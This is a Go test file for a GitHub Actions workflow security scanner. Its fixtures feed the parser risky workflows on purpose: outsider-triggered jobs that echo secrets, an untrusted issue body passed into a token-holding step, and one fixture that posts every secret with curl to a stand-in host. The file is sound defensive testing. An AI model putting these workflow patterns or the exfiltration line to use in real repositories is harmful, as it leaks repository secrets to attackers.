package github

import (
	"reflect"
	"sort"
	"strings"
	"testing"
)

func TestParseWorkflow(t *testing.T) {
	tests := []struct {
		name         string
		yaml         string
		wantOutsider []string
		wantWrite    []string
		wantSecrets  bool
		wantUnparsed bool
	}{
		{
			// octoscope's own release.yml shape. Elevated and
			// secret-reading, and entirely correct: only someone who can
			// already push a tag can trigger it. Must not count as
			// outsider-triggered, or the axis would flag half of GitHub.
			name: "tag-triggered release workflow is powerful but trusted",
			yaml: `
on:
  push:
    tags:
      - "v*"
permissions:
  contents: write
jobs:
  release:
    steps:
      - env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
`,
			wantWrite:   []string{"contents: write"},
			wantSecrets: true,
		},
		{
			// The escalation shape: untrusted input, base-repo secrets.
			name: "pull_request_target with secrets",
			yaml: `
on:
  pull_request_target:
    types: [opened]
permissions:
  contents: write
jobs:
  build:
    steps:
      - run: echo ${{ secrets.NPM_TOKEN }}
`,
			wantOutsider: []string{"pull_request_target"},
			wantWrite:    []string{"contents: write"},
			wantSecrets:  true,
		},
		{
			// A bare `on:` decodes to the string key "on" with this
			// target — measured, not assumed: only a typed map[bool]any
			// turns it into true. The parser also looks up "true" as
			// cheap insurance, which this case does not depend on.
			name: "list-form trigger under a bare on key",
			yaml: `
on: [push, workflow_run]
permissions: write-all
`,
			wantOutsider: []string{"workflow_run"},
			wantWrite:    []string{"write-all"},
		},
		{
			// Flow style is valid YAML and a trivial way to defeat a
			// line-based scanner — the reason this uses a real parser.
			name: "flow-style mapping is still understood",
			yaml: `
on: {issue_comment: {types: [created]}}
permissions: {contents: write, id-token: write}
`,
			wantOutsider: []string{"issue_comment"},
			wantWrite:    []string{"contents: write", "id-token: write"},
		},
		{
			// Per-job permissions override the top level, so a workflow
			// that looks read-only at the top can still be elevated.
			name: "per-job permissions are picked up",
			yaml: `
on: push
permissions:
  contents: read
jobs:
  publish:
    permissions:
      id-token: write
`,
			wantWrite: []string{"id-token: write"},
		},
		{
			name: "read-only permissions are not grants",
			yaml: `
on: push
permissions:
  contents: read
  issues: read
`,
		},
		{
			// #111: the triage shape. Anyone can open an issue on a public
			// repository, the body is theirs, and the run holds the base
			// repository's token — the same reasoning that already put
			// issue_comment on the list. Opening cannot be less untrusted
			// than commenting.
			name: "an issue anyone can open is untrusted input",
			yaml: `
on:
  issues:
    types: [opened]
permissions:
  issues: write
jobs:
  triage:
    steps:
      - run: gh issue comment "$URL" --body "$BODY"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          BODY: ${{ github.event.issue.body }}
`,
			wantOutsider: []string{"issues"},
			wantWrite:    []string{"issues: write"},
			wantSecrets:  true,
		},
		{
			// The scope named `issues` is not the event named `issues`.
			// This grant is elevated, and still inventory: nothing an
			// outsider triggers can reach it, because the trigger is push.
			name: "the issues scope is not the issues event",
			yaml: `
on: push
permissions:
  issues: write
`,
			wantWrite: []string{"issues: write"},
		},
		{
			// Not understood must be distinguishable from understood and
			// clean, or the report would imply a check that never ran.
			name:         "unparseable content is flagged, not silently clean",
			yaml:         "\x00\x01 this: [is not: valid: yaml",
			wantUnparsed: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseWorkflow([]byte(tt.yaml), publicRepoCfg)
			if got.Unparsed != tt.wantUnparsed {
				t.Fatalf("Unparsed = %v, want %v", got.Unparsed, tt.wantUnparsed)
			}
			if got.UsesSecrets != tt.wantSecrets {
				t.Errorf("UsesSecrets = %v, want %v", got.UsesSecrets, tt.wantSecrets)
			}
			sort.Strings(got.OutsiderTriggers)
			sort.Strings(got.WritePerms)
			want := append([]string(nil), tt.wantOutsider...)
			sort.Strings(want)
			if len(got.OutsiderTriggers) != 0 || len(want) != 0 {
				if !reflect.DeepEqual(got.OutsiderTriggers, want) {
					t.Errorf("OutsiderTriggers = %v, want %v", got.OutsiderTriggers, want)
				}
			}
			wantW := append([]string(nil), tt.wantWrite...)
			sort.Strings(wantW)
			if len(got.WritePerms) != 0 || len(wantW) != 0 {
				if !reflect.DeepEqual(got.WritePerms, wantW) {
					t.Errorf("WritePerms = %v, want %v", got.WritePerms, wantW)
				}
			}
		})
	}
}

// #107: whether a workflow would run on the *repository's* default
// permissions. Declaring anything overrides the default, so the question is
// "declares a block at all", not "declares an elevated grant" — a
// distinction the WritePerms extraction alone cannot make, since both cases
// leave it empty.
func TestParseWorkflowInheritsDefaultPerms(t *testing.T) {
	tests := map[string]struct {
		yaml string
		want bool
	}{
		"declares nothing anywhere": {
			yaml: "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: ./build.sh\n",
			want: true,
		},
		"a read-only top-level block still overrides": {
			yaml: "on: pull_request_target\npermissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: ./build.sh\n",
			want: false,
		},
		"an empty top-level block overrides too": {
			yaml: "on: pull_request_target\npermissions: {}\njobs:\n  a:\n    steps:\n      - run: ./build.sh\n",
			want: false,
		},
		"every job declares its own": {
			yaml: "on: pull_request_target\njobs:\n  a:\n    permissions:\n      contents: read\n    steps:\n      - run: ./a.sh\n  b:\n    permissions:\n      issues: write\n    steps:\n      - run: ./b.sh\n",
			want: false,
		},
		// One inheriting job is enough: the workflow can hold power the
		// file never mentions, even though a sibling job is explicit.
		"one job declares, another does not": {
			yaml: "on: pull_request_target\njobs:\n  a:\n    permissions:\n      contents: read\n    steps:\n      - run: ./a.sh\n  b:\n    steps:\n      - run: ./b.sh\n",
			want: true,
		},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			if got := parseWorkflow([]byte(tt.yaml), publicRepoCfg).InheritsDefaultPerms; got != tt.want {
				t.Errorf("InheritsDefaultPerms = %v, want %v", got, tt.want)
			}
		})
	}
}

// The parser is handed bytes from a repository that may be hostile, so
// it must return rather than panic on anything.
func TestParseWorkflowNeverPanics(t *testing.T) {
	for _, in := range []string{
		"", "\n", "---\n", "[]", "null", "on:", "on: null",
		"on:\n  pull_request_target:\njobs: not-a-map",
		"permissions: 42", "jobs:\n  a: 1\n  b: [x]",
	} {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("parseWorkflow(%q, publicRepoCfg) panicked: %v", in, r)
				}
			}()
			_ = parseWorkflow([]byte(in), publicRepoCfg)
		}()
	}
}

// Regressions from the Codex review of #103, extended by #110: ways a
// secret can be reachable that a substring check misses.
//
// The three `inherit` spellings are the point of the structural read. Each
// one decodes to the same `jobs.a.secrets: inherit` mapping GitHub Actions
// consumes — quoting a key and padding after a colon are insignificant to
// YAML — while none but the first contains the literal text
// "secrets: inherit". Measured before the fix: only the plain form scored.
func TestParseWorkflowSecretSpellings(t *testing.T) {
	tests := map[string]string{
		"dot form":              "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ secrets.TOKEN }}\n",
		"index form":            "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ secrets['DEPLOY_TOKEN'] }}\n",
		"inherit form":          "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    secrets: inherit\n",
		"inherit, quoted key":   "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    \"secrets\": inherit\n",
		"inherit, single quote": "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    'secrets': inherit\n",
		"inherit, padded":       "on: pull_request_target\njobs:\n  a:\n    uses: ./.github/workflows/reusable.yml\n    secrets:    inherit\n",
		// toJSON serialises every secret at once while naming none, so it
		// contains neither "secrets." nor "secrets[".
		"toJSON of the context": "on: pull_request_target\njobs:\n  a:\n    env:\n      ALL: ${{ toJSON(secrets) }}\n    steps:\n      - run: curl -d \"$ALL\" https://x.invalid\n",
		"bare context in expr":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo '${{ secrets }}'\n",
		// Dropping quoted literals must not cost a real reference sitting
		// in the same expression as one, nor the index form, whose name is
		// quoted: `secrets['X']` reduces to `secrets[]` and still counts.
		"reference beside a literal":  "on: pull_request_target\njobs:\n  a:\n    if: ${{ contains(github.ref, 'main') && secrets.TOKEN != '' }}\n    steps:\n      - run: true\n",
		"index form beside a literal": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ contains('abc', 'b') }} ${{ secrets['DEPLOY'] }}\n",
		// format() escapes braces by doubling them, so this expression
		// carries a `}}` inside a literal. Ending the expression there
		// would hide the reference that follows (CodeRabbit, #113).
		"reference after a brace-escaping literal": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ format('{{Hello {0}!}}', secrets.TOKEN) }}\n",
	}
	for name, y := range tests {
		t.Run(name, func(t *testing.T) {
			got := parseWorkflow([]byte(y), publicRepoCfg)
			if !got.UsesSecrets {
				t.Errorf("secrets not detected in the %s", name)
			}
			if len(got.OutsiderTriggers) != 1 {
				t.Errorf("outsider trigger not detected: %+v", got.OutsiderTriggers)
			}
		})
	}
}

// The other direction: the word appearing where it reaches nothing must
// not score. Detection only looks inside `${{ … }}`, so prose and
// similarly-named identifiers stay out — a false positive on this axis is
// what teaches people to ignore it.
func TestParseWorkflowSecretsWordWithoutAccess(t *testing.T) {
	tests := map[string]string{
		"in a comment":         "on: pull_request_target\n# no secrets are used here\njobs:\n  a:\n    steps:\n      - run: true\n",
		"in a step name":       "on: pull_request_target\njobs:\n  a:\n    steps:\n      - name: check for secrets\n        run: true\n",
		"a different context":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ github.event.number }}\n",
		"similarly named var":  "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ env.mysecrets }}\n",
		"across two expr ends": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ github.actor }} secrets ${{ github.sha }}\n",
		// Inside an expression the word can be *data*. A workflow reacting
		// to the word reaches no secret (Copilot, #113).
		"single-quoted literal": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ 'secrets' }}\n",
		"double-quoted literal": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ \"secrets\" }}\n",
		"word matched in text":  "on: pull_request_target\njobs:\n  a:\n    if: ${{ contains(github.event.head_commit.message, 'secrets') }}\n    steps:\n      - run: true\n",
		// A commented-out reference reaches nothing, and commented-out code
		// is ordinary. YAML discards comments, so walking the decoded
		// scalars never sees this one (CodeRabbit, #113).
		"reference in a YAML comment": "on: pull_request_target\njobs:\n  a:\n    steps:\n      # - run: echo ${{ secrets.TOKEN }}\n      - run: true\n",
		// vars is a different context. A configuration variable that
		// happens to be called secrets reaches no secret.
		"a variable named secrets": "on: pull_request_target\njobs:\n  a:\n    steps:\n      - run: echo ${{ vars.secrets }}\n",
	}
	for name, y := range tests {
		t.Run(name, func(t *testing.T) {
			if parseWorkflow([]byte(y), publicRepoCfg).UsesSecrets {
				t.Errorf("%s scored as reaching secrets", name)
			}
		})
	}
}

// A runner only matters if a job actually targets it.
func TestParseWorkflowSelfHostedJobs(t *testing.T) {
	tests := map[string]bool{
		"jobs:\n  a:\n    runs-on: ubuntu-latest\n":                false,
		"jobs:\n  a:\n    runs-on: self-hosted\n":                  true,
		"jobs:\n  a:\n    runs-on: [self-hosted, linux]\n":         true,
		"jobs:\n  a:\n    runs-on:\n      group: my-org-runners\n": true,
		"jobs:\n  a:\n    runs-on:\n      labels: [self-hosted]\n": true,
	}
	for y, want := range tests {
		if got := parseWorkflow([]byte("on: push\n"+y), publicRepoCfg).SelfHostedJobs; got != want {
			t.Errorf("SelfHostedJobs = %v, want %v for:\n%s", got, want, y)
		}
	}
}

// publicRepoCfg is the configuration the workflow tests assume: a public
// repository with issues, discussions and forking all on.
//
// Written out rather than left as the zero value, deliberately. The zero
// repoTriggerConfig means every feature off and issue creation restricted,
// under which no conditional trigger is reachable — so a test asserting that `issues` is
// an outsider trigger would have failed, and one asserting it is NOT would
// have passed for entirely the wrong reason.
var publicRepoCfg = repoTriggerConfig{
	DiscussionsEnabled:     true,
	IssuesEnabled:          true,
	ForkingAllowed:         true,
	IssuesOpenableByAnyone: true,
}

// allFlagsOn is publicRepoCfg under the name the tests below actually mean:
// every feature enabled. Visibility is no longer part of the decision.
var allFlagsOn = publicRepoCfg

// #114 asked for each configuration-dependent event to be settled on its
// own rather than in bulk, so this asserts them one at a time, each against
// the flag that gates it and against its absence.
//
// **Visibility is not among the gates**, and the row that says so is the
// point of the table. The first version of this change required the
// repository to be public, which produced a false negative: a privileged
// workflow on `issues` in a private or internal repository scored zero and
// the maintainer was never told. Read access is not write access, and on an
// internal repository every enterprise member has it.
func TestConditionalTriggersFollowTheFeatureFlags(t *testing.T) {
	off := repoTriggerConfig{}
	only := func(f func(*repoTriggerConfig)) repoTriggerConfig {
		c := repoTriggerConfig{}
		f(&c)
		return c
	}
	cases := []struct {
		event string
		cfg   repoTriggerConfig
		want  bool
		why   string
	}{
		{"issues", only(func(c *repoTriggerConfig) {
			c.IssuesEnabled, c.IssuesOpenableByAnyone = true, true
		}), true, "issues on, anyone may open"},
		{"issues", off, false, "issues off"},
		// The setting an earlier version of this change dismissed as
		// costing an extra REST call. It does not: issueCreationPolicy is
		// on the same query, at the same cost.
		{"issues", only(func(c *repoTriggerConfig) { c.IssuesEnabled = true }), false,
			"issues on but creation is collaborators-only"},

		{"discussion", only(func(c *repoTriggerConfig) { c.DiscussionsEnabled = true }), true, "discussions on"},
		{"discussion", off, false, "discussions off"},
		{"discussion_comment", only(func(c *repoTriggerConfig) { c.DiscussionsEnabled = true }), true, "discussions on"},
		{"discussion_comment", off, false, "discussions off"},

		{"fork", only(func(c *repoTriggerConfig) { c.ForkingAllowed = true }), true, "forking allowed"},
		{"fork", off, false, "forking disallowed"},

		// Unconditional, and `watch` is among them now: nothing gates
		// starring, and whoever can see the repository can do it.
		{"watch", off, true, "never gated"},
		{"pull_request_target", off, true, "never gated"},
		{"issue_comment", off, true, "never gated"},
		{"workflow_run", off, true, "never gated"},

		// Settled as staying out: the override that would make it
		// reachable is unreadable, so it is not assumed.
		{"pull_request", allFlagsOn, false, "read-only token, no secrets"},
		{"push", allFlagsOn, false, "only someone who can already push"},
		{"schedule", allFlagsOn, false, "runs the base branch's own workflow"},
	}
	for _, c := range cases {
		why, got := triggerReason(c.event, c.cfg)
		if got != c.want {
			t.Errorf("triggerReason(%q, %s) = %v, want %v", c.event, c.why, got, c.want)
			continue
		}
		if got && why == "" {
			t.Errorf("%s is an outsider trigger with no reason to show", c.event)
		}
	}
}

// An event must depend on ITS OWN flag and no other. A cross-dependency —
// `issues` needing DiscussionsEnabled as well — passes any table whose rows
// only ever turn everything on at once, which a review pass pointed out.
func TestEachConditionalEventDependsOnExactlyOneFlag(t *testing.T) {
	flags := map[string]func(*repoTriggerConfig){
		"discussions": func(c *repoTriggerConfig) { c.DiscussionsEnabled = true },
		"issues":      func(c *repoTriggerConfig) { c.IssuesEnabled = true },
		"forking":     func(c *repoTriggerConfig) { c.ForkingAllowed = true },
	}
	// `issues` needs TWO settings, so it is checked by its own case above
	// rather than here; these are the single-flag events.
	want := map[string]string{
		"discussion": "discussions", "discussion_comment": "discussions",
		"fork": "forking",
	}
	for event, needs := range want {
		for name, set := range flags {
			c := repoTriggerConfig{}
			set(&c)
			_, got := triggerReason(event, c)
			if got != (name == needs) {
				t.Errorf("%s with only %s on = %v; it must depend on %s and nothing else",
					event, name, got, needs)
			}
		}
	}
}

// The reasons are what the report prints, so two of them being swapped is a
// user-visible defect. Checking they are merely DISTINCT does not catch a
// swap — a review pass pointed that out — so each is pinned to its own
// event by a word only that event's reason contains.
func TestEveryTriggerReasonNamesItsOwnEvent(t *testing.T) {
	want := map[string]string{
		"pull_request_target": "fork's pull request",
		"workflow_run":        "after another workflow",
		"issue_comment":       "comment from anyone",
		"watch":               "stars it",
		"issues":              "title and body",
		"discussion":          "a discussion anyone",
		"discussion_comment":  "comment anyone who can comment can leave",
		"fork":                "forks it",
	}
	for ev, fragment := range want {
		why, ok := triggerReason(ev, allFlagsOn)
		if !ok {
			t.Errorf("%s is not reachable with every setting permissive", ev)
			continue
		}
		if !strings.Contains(why, fragment) {
			t.Errorf("%s reads %q, which does not contain %q — the reasons may be swapped",
				ev, why, fragment)
		}
	}
}

// The end-to-end shape: the same workflow file, two repositories. Asserting
// the exact SET rather than the count — a review pass pointed out that the
// count alone passes if the parser returns the wrong two.
func TestWorkflowTriggersDependOnTheRepositoryNotOnlyTheFile(t *testing.T) {
	const yml = `
on: [discussion, watch, push]
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
`
	got := func(cfg repoTriggerConfig) map[string]bool {
		out := map[string]bool{}
		for _, ev := range parseWorkflow([]byte(yml), cfg).OutsiderTriggers {
			out[ev] = true
		}
		return out
	}

	on := got(allFlagsOn)
	if len(on) != 2 || !on["discussion"] || !on["watch"] {
		t.Errorf("discussions on: got %v, want exactly discussion and watch", on)
	}

	// Everything off: `discussion` goes, `watch` stays, because nothing
	// gates starring. This is the row that would have been empty under the
	// visibility gate, and empty is the false negative.
	off := got(repoTriggerConfig{})
	if len(off) != 1 || !off["watch"] {
		t.Errorf("discussions off: got %v, want exactly watch", off)
	}

	// `push` is in neither map and must stay out of both.
	for _, m := range []map[string]bool{on, off} {
		if m["push"] {
			t.Error("push is not outsider-triggerable: only someone who can already push causes it")
		}
	}
}

// The pairing between GitHub's names and the axis's. One flag at a time,
// never all three: an all-true fixture cannot see a cross-wire, and a
// mutation feeding HasIssuesEnabled into DiscussionsEnabled survived
// exactly that.
func TestTriggerConfigFromPairsEachFlagWithItsOwn(t *testing.T) {
	for _, c := range []struct {
		name string
		in   repoFeatureFlags
		get  func(repoTriggerConfig) bool
	}{
		{"discussions", repoFeatureFlags{HasDiscussionsEnabled: true},
			func(c repoTriggerConfig) bool { return c.DiscussionsEnabled }},
		{"issues", repoFeatureFlags{HasIssuesEnabled: true},
			func(c repoTriggerConfig) bool { return c.IssuesEnabled }},
		{"forking", repoFeatureFlags{ForkingAllowed: true},
			func(c repoTriggerConfig) bool { return c.ForkingAllowed }},
	} {
		got := triggerConfigFrom(c.in)
		if !c.get(got) {
			t.Errorf("%s did not reach its own field: %+v", c.name, got)
		}
		n := 0
		for _, b := range []bool{got.DiscussionsEnabled, got.IssuesEnabled, got.ForkingAllowed} {
			if b {
				n++
			}
		}
		if n != 1 {
			t.Errorf("%s alone set %d fields, want exactly 1: %+v", c.name, n, got)
		}
	}

	// issueCreationPolicy is a STRING, so its interpretation is a place to
	// be wrong in both directions, and mutations inverting it survived a
	// version of this test that only exercised repoTriggerConfig directly.
	for _, c := range []struct {
		policy string
		open   bool
		why    string
	}{
		{"ALL", true, "the permissive value GitHub sends"},
		{"COLLABORATORS_ONLY", false, "the one value that closes the door"},
		{"", true, "unset: a query that did not ask must not read as restricted"},
		{"SOMETHING_GITHUB_ADDS_LATER", true, "an unrecognised value leaves the event scored"},
	} {
		got := triggerConfigFrom(repoFeatureFlags{
			HasIssuesEnabled: true, IssueCreationPolicy: c.policy,
		})
		if got.IssuesOpenableByAnyone != c.open {
			t.Errorf("policy %q -> openable %v, want %v (%s)",
				c.policy, got.IssuesOpenableByAnyone, c.open, c.why)
		}
		// And the end of the chain, not just the field.
		if _, ok := triggerReason("issues", got); ok != c.open {
			t.Errorf("policy %q -> issues scored %v, want %v", c.policy, ok, c.open)
		}
	}

	// And the zero value reaches nothing — the property that makes an
	// unpopulated config safe rather than permissive. There is no
	// visibility field left to fail open.
	empty := triggerConfigFrom(repoFeatureFlags{})
	for _, ev := range []string{"issues", "discussion", "discussion_comment", "fork"} {
		if _, ok := triggerReason(ev, empty); ok {
			t.Errorf("%s scored on a zero config", ev)
		}
	}
}
